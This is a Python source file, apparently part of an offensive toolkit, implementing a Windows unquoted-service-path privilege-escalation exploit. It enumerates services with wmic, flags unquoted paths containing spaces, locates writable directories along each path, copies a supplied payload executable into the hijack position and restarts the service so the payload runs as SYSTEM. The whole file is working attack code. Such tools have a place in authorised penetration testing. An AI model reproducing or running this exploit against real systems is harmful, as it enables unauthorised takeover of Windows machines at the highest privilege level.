import os
import shutil
import subprocess
from pathlib import Path
from typing import Dict, List, Optional

import sys

sys.path.append(str(Path(__file__).parent.parent))
from ..core.base import ServiceExploitBase


class UnquotedPathExploit(ServiceExploitBase):
    """Exploit unquoted service paths for privilege escalation."""

    def __init__(self, output_dir: str = "service_exploits"):
        """
        Initialize the unquoted path exploit module.

        Args:
            output_dir: Directory for storing output files
        """
        super().__init__(output_dir)
        self.vulnerable_services: List[Dict] = []
        self.log("Unquoted Path Exploit module initialized", "SUCCESS")

    def enumerate(self) -> List[Dict]:
        """
        Find services with unquoted paths containing spaces.

        Returns:
            List of vulnerable service dictionaries
        """
        self.log("Searching for unquoted service paths...")

        cmd = 'wmic service get name,displayname,pathname,startmode'
        result = self.run_command(cmd)

        self.vulnerable_services = []

        lines = result.stdout.split('\n')[1:]  # Skip header

        for line in lines:
            if not line.strip():
                continue

            service_info = self._parse_wmic_line(line)

            if service_info and self._is_vulnerable(service_info['path']):
                self.vulnerable_services.append(service_info)

                self.log(f"Found vulnerable service: {service_info['name']}", "SUCCESS")
                self.log(f"  Path: {service_info['path']}")

        self.log(f"Found {len(self.vulnerable_services)} vulnerable services", "INFO")
        return self.vulnerable_services

    def _parse_wmic_line(self, line: str) -> Optional[Dict]:
        """
        Parse a WMIC output line to extract service information.

        Args:
            line: Raw WMIC output line

        Returns:
            Dictionary with service info or None
        """
        # Find path (starts with drive letter)
        path_start = line.find('C:\\')
        if path_start == -1:
            return None

        path_part = line[path_start:]

        # Find where path ends (at start mode)
        path = None
        start_mode = None

        for mode in ['Auto', 'Manual', 'Disabled']:
            if mode in path_part:
                idx = path_part.find(mode)
                path = path_part[:idx].strip()
                start_mode = mode
                break

        if not path:
            return None

        # Get service name (first field before display name)
        parts = line[:path_start].strip().split()
        if not parts:
            return None

        return {
            'name': parts[0],
            'path': path,
            'start_mode': start_mode
        }

    def _is_vulnerable(self, path: str) -> bool:
        """
        Check if a service path is vulnerable to unquoted path attack.

        Args:
            path: Service binary path

        Returns:
            True if vulnerable, False otherwise
        """
        # Must not be quoted
        if path.startswith('"'):
            return False

        # Must contain spaces
        if ' ' not in path:
            return False

        # Must be an executable
        if not path.lower().endswith('.exe'):
            return False

        return True

    def find_exploitable_locations(self, service_path: str) -> List[Dict]:
        """
        Find writable locations where a malicious executable can be placed.

        Args:
            service_path: The vulnerable service path

        Returns:
            List of exploitable location dictionaries
        """
        self.log(f"Analyzing exploitable locations for: {service_path}")

        exploitable = []
        parts = service_path.split()
        current_path = ""

        for i, part in enumerate(parts[:-1]):  # Exclude last part (filename)
            current_path += part

            if os.path.exists(current_path):
                if self.check_writable(current_path):
                    # Determine malicious filename
                    next_part = parts[i + 1]
                    mal_name = next_part + '.exe' if not next_part.endswith('.exe') else next_part
                    mal_path = os.path.join(current_path, mal_name)

                    exploitable.append({
                        'directory': current_path,
                        'malicious_path': mal_path,
                        'remaining_path': ' '.join(parts[i + 1:])
                    })

                    self.log(f"Writable location found: {current_path}", "SUCCESS")
                    self.log(f"  Place payload as: {mal_path}")

            current_path += ' '

        if not exploitable:
            self.log("No writable locations found for this service path", "WARNING")

        return exploitable

    def exploit(self, service_name: str, payload_path: str, target_path: str = None) -> bool:
        """
        Exploit an unquoted service path vulnerability.

        Args:
            service_name: Name of the vulnerable service
            payload_path: Path to the malicious executable
            target_path: Where to place the payload (auto-detected if not provided)

        Returns:
            True if exploitation successful, False otherwise
        """
        self.log(f"Exploiting unquoted path for service: {service_name}")

        # Verify payload exists
        if not os.path.exists(payload_path):
            self.log(f"Payload not found: {payload_path}", "ERROR")
            return False

        # Get service path if target not specified
        if not target_path:
            binary_path = self.get_service_binary_path(service_name)

            if not binary_path:
                self.log("Could not determine service binary path", "ERROR")
                return False

            locations = self.find_exploitable_locations(binary_path)

            if not locations:
                self.log("No exploitable locations found", "ERROR")
                return False

            target_path = locations[0]['malicious_path']

        try:
            # Copy payload to target location
            self.log(f"Copying payload to: {target_path}")
            shutil.copy2(payload_path, target_path)
            self.log("Payload deployed successfully", "SUCCESS")

            # Attempt service restart
            if self.restart_service(service_name):
                self.log("Exploitation complete - payload executing as SYSTEM", "SUCCESS")
                return True
            else:
                self.log("Service not restarted - wait for reboot or manual restart", "WARNING")
                return True  # Payload is in place

        except PermissionError:
            self.log(f"Permission denied writing to: {target_path}", "ERROR")
            return False
        except Exception as e:
            self.log(f"Exploitation failed: {e}", "ERROR")
            return False

    def cleanup(self, target_path: str) -> bool:
        """
        Remove deployed payload after exploitation.

        Args:
            target_path: Path to the deployed payload

        Returns:
            True if cleanup successful, False otherwise
        """
        self.log(f"Cleaning up: {target_path}")

        try:
            if os.path.exists(target_path):
                os.remove(target_path)
                self.log("Payload removed successfully", "SUCCESS")
                return True
            else:
                self.log("Payload not found (may already be removed)", "WARNING")
                return True
        except Exception as e:
            self.log(f"Cleanup failed: {e}", "ERROR")
            return False


if __name__ == "__main__":
    # Standalone usage example
    exploit = UnquotedPathExploit()

    print("\n" + "=" * 60)
    print("Unquoted Service Path Vulnerability Scanner")
    print("=" * 60 + "\n")

    vulnerable = exploit.enumerate()

    if vulnerable:
        print(f"\n[+] Found {len(vulnerable)} vulnerable services:\n")

        for svc in vulnerable:
            print(f"  Service: {svc['name']}")
            print(f"  Path: {svc['path']}")

            locations = exploit.find_exploitable_locations(svc['path'])

            if locations:
                print(f"  Exploitable: YES")
                for loc in locations:
                    print(f"    -> {loc['malicious_path']}")
            else:
                print(f"  Exploitable: NO (no writable directories)")

            print()
    else:
        print("\n[-] No vulnerable services found")